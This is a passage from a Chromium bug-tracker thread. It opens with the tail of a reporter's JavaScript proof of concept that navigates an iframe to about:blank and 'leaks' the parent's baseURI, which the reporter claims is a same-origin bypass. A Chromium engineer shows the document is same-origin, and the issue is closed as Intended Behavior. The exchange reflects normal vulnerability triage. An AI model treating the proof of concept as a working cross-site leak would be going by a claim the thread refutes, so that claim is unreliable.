document.body.appendChild(leakDiv);<br>                } catch (e) {<br>                    console.error(&quot;Failed to leak baseURI: &quot; + e);<br>                }<br>            }, 100); // Delay to ensure the &#39;about:blank&#39; page has loaded<br>        } catch (e) {<br>            console.error(&quot;Failed to manipulate iframe location: &quot; + e);<br>        }<br>    });<br>&lt;/script&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br><br>Notice, that the Parent Base URI is leaked and also check the dev tool you will find the parent window BaseURI.<br><br>The bad thing about this exploit code is that the iframe is not even cross-origin but also cross-site still it is able to read the BaseURI of parent window. The down side of this exploit is this we need some sort of Cross Site Scripting or any Subdomain hijacking vulnerability to exploit this in the real world attacks to host our exploit script somewhere on the website.<br><br>Thanks<br>Ilyas
+
+Author: pe...@google.com
+<p>japhet: Uh oh! This issue still open and hasn&#39;t been updated in the last 14 days. This is a serious vulnerability, and we want to ensure that there&#39;s progress. Could you please leave an update with the current status and any potential blockers?</p>
+<p>If you&#39;re not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?</p>
+<p>If the issue is fixed or you can&#39;t reproduce it, please close the bug. If you&#39;ve started working on a fix, please set the status to Started.</p>
+<p>Thanks for your time! To disable nags, add Disable-Nags (case sensitive) to the Chromium Labels custom field.</p>
+
+Author: ja...@chromium.org
+TTJSbVpUWmxPREk1TURVME1EVXlZalUyTkRnMU1UTTNPVGt6T1RkbE9UYz0=
+
+Author: [secondary security shepherd]
+
+Hi japhet@, could you take a look and provide an update? The bug reporter added a more concise proof of concept. A previous comment notes that the fix may be similar to the one for  crbug.com/40060755 which you also worked on.
+TTJSbVpUWmxPREk1TURVME1EVXlZalUyTkRnMU1UTTNPVGt6T1RkbE9UYz0=
+
+Author: ja...@chromium.org
+Either I&#39;m misunderstanding the repro steps, or this is Working as Intended.<br><br>If a parent navigates its child iframe to &quot;about:blank&quot;, the resulting &quot;about:blank&quot; document&#39;s origin will be the same as its parent&#39;s origin. So as far as I can tell, all of the operations in the `hack()` step are occurring on a same-origin document.<br><br><br>Did I miss something?
+
+Author: ik...@gmail.com
+TnpVNE5UTmpPVFpoWkRCalpUYzVOV1l5WXpsaFpESXhaak0zTWpsbU16WT0=
+
+Author: Nope you have identified it correctly this turns out to be the same origin
+not an issue.
+
+Thanks
+Ilyas
+
+On Wed, Sep 18, 2024, 3:06 AM <buganizer-system@google.com> wrote:
+
+> Replying to this email means your email address will be shared with the
+> team that works on this product.
+> https://issues.chromium.org/issues/361344234
+>
+> *Changed*
+>
+> *ja...@chromium.org <ja...@chromium.org> added comment #16
+> <https://issues.chromium.org/issues/361344234#comment16>:*
+> Either I'm misunderstanding the repro steps, or this is Working as
+> Intended.
+>
+> If a parent navigates its child iframe to "about:blank", the resulting
+> "about:blank" document's origin will be the same as its parent's origin. So
+> as far as I can tell, all of the operations in the `hack()` step are
+> occurring on a same-origin document.
+>
+>
+> Did I miss something?
+> _______________________________
+>
+> *Reference Info: 361344234 SOP bypass leaks navigation history of sub
+> iframe from other subdomain if location changed*
+> component:  Public Trackers > 1362134 > Chromium > UI > Browser >
+> Navigation <https://issues.chromium.org/components/1457065>
+> status:  Assigned
+> reporter:  ik259868@gmail.com
+> assignee:  ja...@chromium.org
+> cc:  cr...@chromium.org, ik259868@gmail.com, jd...@chromium.org
+> collaborators:  se...@chromium.org
+> type:  Vulnerability
+> access level:  Limited visibility
+> priority:  P2
+> severity:  S2
+> found in:  127
+> hotlist:  external_security_report
+> <https://issues.chromium.org/hotlists/5433527>, Security_Impact-Extended
+> <https://issues.chromium.org/hotlists/5432548>, Unconfirmed
+> <https://issues.chromium.org/hotlists/5437934>
+> retention:  Component default
+> BuildNumber:  127.0.6533.120 (Official Build) (64-bit)
+> Component Ancestor Tags:  UI, UI>Browser, UI>Browser>Navigation
+> Component Tags:  UI>Browser>Navigation
+> Milestone:  129
+> OS:  Android, Fuchsia, Linux, Mac, Windows, Lacros, ChromeOS
+>
+>
+> Generated by Google IssueTracker notification system.
+>
+> You're receiving this email because you are subscribed to updates on
+> Google IssueTracker issue 361344234
+> <https://issues.chromium.org/issues/361344234> where you have the roles:
+> reporter, cc
+> Unsubscribe from this issue.
+> <https://issues.chromium.org/issues/361344234?unsubscribe=true>
+>
+TnpVNE5UTmpPVFpoWkRCalpUYzVOV1l5WXpsaFpESXhaak0zTWpsbU16WT0=
+
+Author: ja...@chromium.org
+type.googleapis.com/google.protobuf.Int32Value
+
+Author: ja...@chromium.org
+Thanks for confirming! I think we can close this as Intended Behavior.
+
+Author: ik...@gmail.com
+TkdFMFlUQXdPVGN6T0Rjd1lUUmpZak00T0dKallUWm1NVGN5TVRReU1EWT0=
+
+Author: Yes sure
+
+On Wed, Sep 18, 2024, 10:00 PM <buganizer-system@google.com> wrote:
+
+> Replying to this email means your email address will be shared with the
+> team that works on this product.
+> https://issues.chromium.org/issues/361344234
+>
+> *Changed*
+> status:  Assigned → Intended Behavior
+>
+> *ja...@chromium.org <ja...@chromium.org> added comment #18
+> <https://issues.chromium.org/issues/361344234#comment18>:*
+> Thanks for confirming! I think we can close this as Intended Behavior.
+> _______________________________
+>
+> *Reference Info: 361344234 SOP bypass leaks navigation history of sub
+> iframe from other subdomain if location changed*
+> component:  Public Trackers > 1362134 > Chromium > UI > Browser >
+> Navigation <https://issues.chromium.org/components/1457065>
+> status:  Intended Behavior
+> reporter:  ik259868@gmail.com
+> assignee:  ja...@chromium.org
+> cc:  cr...@chromium.org, ik259868@gmail.com, jd...@chromium.org
+> collaborators:  se...@chromium.org
+> type:  Vulnerability
+> access level:  Limited visibility
+> priority:  P2
+> severity:  S2
+> found in:  127
+> hotlist:  external_security_report
+> <https://issues.chromium.org/hotlists/5433527>, Security_Impact-Extended
+> <https://issues.chromium.org/hotlists/5432548>, Unconfirmed
+> <https://issues.chromium.org/hotlists/5437934>
+> retention:  Component default
+> BuildNumber:  127.0.6533.120 (Official Build) (64-bit)
+> Component Ancestor Tags:  UI, UI>Browser, UI>Browser>Navigation
+> Component Tags:  UI>Browser>Navigation
+> Milestone:  129
+> OS:  Android, Fuchsia, Linux, Mac, Windows, Lacros, ChromeOS
+>
+>
+> Generated by Google IssueTracker notification system.
+>
+> You're receiving this email because you are subscribed to updates on
+> Google IssueTracker issue 361344234
+> <https://issues.chromium.org/issues/361344234> where you have the roles:
+> reporter, cc
+> Unsubscribe from this issue.
+> <https://issues.chromium.org/issues/361344234?unsubscribe=true>
+>
+TkdFMFlUQXdPVGN6T0Rjd1lUUmpZak00T0dKallUWm1NVGN5TVRReU1EWT0=
+
+Author: pe...@google.com
+<p>This bug has been closed for more than 14 weeks. Removing issue access restrictions.</p>
+
+Author: pe...@google.com
+type.googleapis.com/google.devtools.issuetracker.v1.IssueAccessLimit
